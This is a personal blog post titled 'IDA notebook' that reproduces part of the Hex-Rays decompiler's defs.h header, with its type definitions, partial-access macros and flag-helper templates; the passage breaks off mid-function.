<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="陈戳戳的日记本"><meta name="keywords" content><meta name="author" content="Po1lux"><meta name="copyright" content="Po1lux"><title>Po1lux's Diary</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG.jpg"></div><div class="author-info__name text-center">Po1lux</div><div class="author-info__description text-center">陈戳戳的日记本</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">47</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">28</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div></div></div><nav id="nav" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Po1lux's Diary</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">Po1lux's Diary</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/20/2019-11-20 IDA-notebook/">IDA notebook</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-20</time><div class="content"><h1 id="1-&#x5E38;&#x7528;&#x5B8F;&#x5B9A;&#x4E49;"><a href="#1-&#x5E38;&#x7528;&#x5B8F;&#x5B9A;&#x4E49;" class="headerlink" title="1. &#x5E38;&#x7528;&#x5B8F;&#x5B9A;&#x4E49;"></a>1. &#x5E38;&#x7528;&#x5B8F;&#x5B9A;&#x4E49;</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This file contains definitions used by the Hex-Rays decompiler output.</span></span><br><span class="line"><span class="comment">   It has type definitions and convenience macros to make the</span></span><br><span class="line"><span class="comment">   output more readable.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Copyright (c) 2007-2011 Hex-Rays</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__GNUC__)</span></span><br><span class="line">  <span class="keyword">typedef</span>          <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> __int64 long long</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> __int32 int</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> __int16 short</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> __int8  char</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> MAKELL(num) num ## LL</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> FMT_64 <span class="meta-string">&quot;ll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(_MSC_VER)</span></span><br><span class="line">  <span class="keyword">typedef</span>          __int64 ll;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int64 ull;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> MAKELL(num) num ## i64</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> FMT_64 <span class="meta-string">&quot;I64&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined (__BORLANDC__)</span></span><br><span class="line">  <span class="keyword">typedef</span>          __int64 ll;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int64 ull;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> MAKELL(num) num ## i64</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> FMT_64 <span class="meta-string">&quot;L&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;unknown compiler&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> uint;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> uchar;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> ushort;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ulong;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>          <span class="keyword">char</span>   int8;</span><br><span class="line"><span class="keyword">typedef</span>   <span class="keyword">signed</span> <span class="keyword">char</span>   sint8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>   uint8;</span><br><span class="line"><span class="keyword">typedef</span>          <span class="keyword">short</span>  int16;</span><br><span class="line"><span class="keyword">typedef</span>   <span class="keyword">signed</span> <span class="keyword">short</span>  sint16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span>  uint16;</span><br><span class="line"><span class="keyword">typedef</span>          <span class="keyword">int</span>    int32;</span><br><span class="line"><span class="keyword">typedef</span>   <span class="keyword">signed</span> <span class="keyword">int</span>    sint32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>    uint32;</span><br><span class="line"><span class="keyword">typedef</span> ll              int64;</span><br><span class="line"><span class="keyword">typedef</span> ll              sint64;</span><br><span class="line"><span class="keyword">typedef</span> ull             uint64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Partially defined types:</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BYTE  uint8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WORD  uint16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _QWORD uint64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(_MSC_VER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _LONGLONG __int128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WINDOWS_</span></span><br><span class="line"><span class="keyword">typedef</span> int8 BYTE;</span><br><span class="line"><span class="keyword">typedef</span> int16 WORD;</span><br><span class="line"><span class="keyword">typedef</span> int32 DWORD;</span><br><span class="line"><span class="keyword">typedef</span> int32 LONG;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">typedef</span> int64 QWORD;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">bool</span>;       <span class="comment">// we want to use bool in our C programs</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Some convenience macros to make partial accesses nicer</span></span><br><span class="line"><span class="comment">// first unsigned macros:</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOBYTE(x)   (*((_BYTE*)&amp;(x)))   <span class="comment">// low byte</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOWORD(x)   (*((_WORD*)&amp;(x)))   <span class="comment">// low word</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))  <span class="comment">// low dword</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIBYTE(x)   (*((_BYTE*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIWORD(x)   (*((_WORD*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIDWORD(x)  (*((_DWORD*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORDn(x, n)   (*((_WORD*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE1(x)   BYTEn(x,  1)         <span class="comment">// byte 1 (counting from 0)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE2(x)   BYTEn(x,  2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE3(x)   BYTEn(x,  3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE4(x)   BYTEn(x,  4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE5(x)   BYTEn(x,  5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE6(x)   BYTEn(x,  6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE7(x)   BYTEn(x,  7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE8(x)   BYTEn(x,  8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE9(x)   BYTEn(x,  9)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE10(x)  BYTEn(x, 10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE11(x)  BYTEn(x, 11)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE12(x)  BYTEn(x, 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE13(x)  BYTEn(x, 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE14(x)  BYTEn(x, 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE15(x)  BYTEn(x, 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD1(x)   WORDn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD2(x)   WORDn(x,  2)         <span class="comment">// third word of the object, unsigned</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD3(x)   WORDn(x,  3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD4(x)   WORDn(x,  4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD5(x)   WORDn(x,  5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD6(x)   WORDn(x,  6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD7(x)   WORDn(x,  7)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// now signed macros (the same but with sign extension)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLOBYTE(x)   (*((int8*)&amp;(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLOWORD(x)   (*((int16*)&amp;(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLODWORD(x)  (*((int32*)&amp;(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIBYTE(x)   (*((int8*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIWORD(x)   (*((int16*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIDWORD(x)  (*((int32*)&amp;(x)+1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORDn(x, n)   (*((int16*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE3(x)   SBYTEn(x,  3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE4(x)   SBYTEn(x,  4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE5(x)   SBYTEn(x,  5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE6(x)   SBYTEn(x,  6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE7(x)   SBYTEn(x,  7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE8(x)   SBYTEn(x,  8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE9(x)   SBYTEn(x,  9)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE10(x)  SBYTEn(x, 10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE11(x)  SBYTEn(x, 11)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE12(x)  SBYTEn(x, 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE13(x)  SBYTEn(x, 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE14(x)  SBYTEn(x, 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE15(x)  SBYTEn(x, 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD1(x)   SWORDn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD2(x)   SWORDn(x,  2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD3(x)   SWORDn(x,  3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD4(x)   SWORDn(x,  4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD5(x)   SWORDn(x,  5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD6(x)   SWORDn(x,  6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWORD7(x)   SWORDn(x,  7)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper functions to represent some assembly instructions.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill memory block with an integer value</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">memset32</span><span class="params">(<span class="keyword">void</span> *ptr, uint32 value, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  uint32 *p = (uint32 *)ptr;</span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">int</span> i=<span class="number">0</span>; i &lt; count; i++ )</span><br><span class="line">    *p++ = value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate a reference to pair of operands</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;  <span class="title">int16</span> __<span class="title">PAIR__</span>( <span class="title">int8</span>  <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> ((( int16)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint8(low); }</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;  <span class="title">int32</span> __<span class="title">PAIR__</span>( <span class="title">int16</span> <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> ((( int32)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint16(low); }</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;  <span class="title">int64</span> __<span class="title">PAIR__</span>( <span class="title">int32</span> <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> ((( int64)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint32(low); }</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">uint16</span> __<span class="title">PAIR__</span>(<span class="title">uint8</span>  <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> (((uint16)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint8(low); }</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">uint32</span> __<span class="title">PAIR__</span>(<span class="title">uint16</span> <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> (((uint32)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint16(low); }</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">uint64</span> __<span class="title">PAIR__</span>(<span class="title">uint32</span> <span class="title">high</span>, <span class="title">T</span> <span class="title">low</span>) {</span> <span class="keyword">return</span> (((uint64)high) &lt;&lt; <span class="keyword">sizeof</span>(high)*<span class="number">8</span>) | uint32(low); }</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate left</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> __<span class="title">ROL__</span>(<span class="title">T</span> <span class="title">value</span>, <span class="title">uint</span> <span class="title">count</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">const</span> uint nbits = <span class="keyword">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  T high = value &gt;&gt; (nbits - count);</span><br><span class="line">  value &lt;&lt;= count;</span><br><span class="line">  value |= high;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate right</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> __<span class="title">ROR__</span>(<span class="title">T</span> <span class="title">value</span>, <span class="title">uint</span> <span class="title">count</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">const</span> uint nbits = <span class="keyword">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  T low = value &lt;&lt; (nbits - count);</span><br><span class="line">  value &gt;&gt;= count;</span><br><span class="line">  value |= low;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// carry flag of left shift</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int8</span> __<span class="title">MKCSHL__</span>(<span class="title">T</span> <span class="title">value</span>, <span class="title">uint</span> <span class="title">count</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">const</span> uint nbits = <span class="keyword">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (value &gt;&gt; (nbits-count)) &amp; <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// carry flag of right shift</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int8</span> __<span class="title">MKCSHR__</span>(<span class="title">T</span> <span class="title">value</span>, <span class="title">uint</span> <span class="title">count</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">return</span> (value &gt;&gt; (count<span class="number">-1</span>)) &amp; <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// sign flag</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int8</span> __<span class="title">SETS__</span>(<span class="title">T</span> <span class="title">x</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">sizeof</span>(T) == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> int8(x) &lt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">sizeof</span>(T) == <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> int16(x) &lt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">sizeof</span>(T) == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> int32(x) &lt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> int64(x) &lt; <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// overflow flag of subtraction (x-y)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">U</span>&gt; <span class="title">int8</span> __<span class="title">OFSUB__</span>(<span class="title">T</span> <span class="title">x</span>, <span class="title">U</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">sizeof</span>(T) &lt; <span class="keyword">sizeof</span>(U) )</span><br><span class="line">  